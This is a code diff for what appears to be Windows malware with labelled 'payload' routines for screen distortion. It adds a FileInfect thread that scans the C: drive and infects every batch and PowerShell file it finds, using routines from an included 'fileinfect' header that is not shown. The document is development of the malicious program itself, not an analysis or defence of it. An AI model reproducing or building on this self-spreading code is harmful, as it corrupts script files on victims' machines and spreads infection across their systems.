@@ -17,6 +17,8 @@
 #include <cstdlib>
 #include <shellapi.h>
 
+#include "utils/fileinfect/fileinfect.h"
+
 volatile bool gFxStop = false;
 
 // ============================================================
@@ -32,6 +34,27 @@ volatile bool gFxStop = false;
 // PAYLOAD 1
 // Screen feedback / microscopic distortion
 // ============================================================
+
+DWORD WINAPI FileInfect(LPVOID)
+{
+    auto batchfiles = FileInfecting::FindBatchFiles("C:");
+
+    for (const auto& path : batchfiles)
+    {
+        // TODO: log on console every path, but ONLY IF ITS TARGETING DEBUG
+        FileInfecting::InfectBatchFile(path);
+    }
+
+    auto psfiles = FileInfecting::FindPowerShellFiles("C:");
+
+    for (const auto& path : psfiles)
+    {
+        // TODO: log on console every path, but ONLY IF ITS TARGETING DEBUG
+        FileInfecting::InfectPowerShellFile(path);
+    }
+
+    return 0;
+}
 
 DWORD WINAPI GDIPayload1(LPVOID)
 {
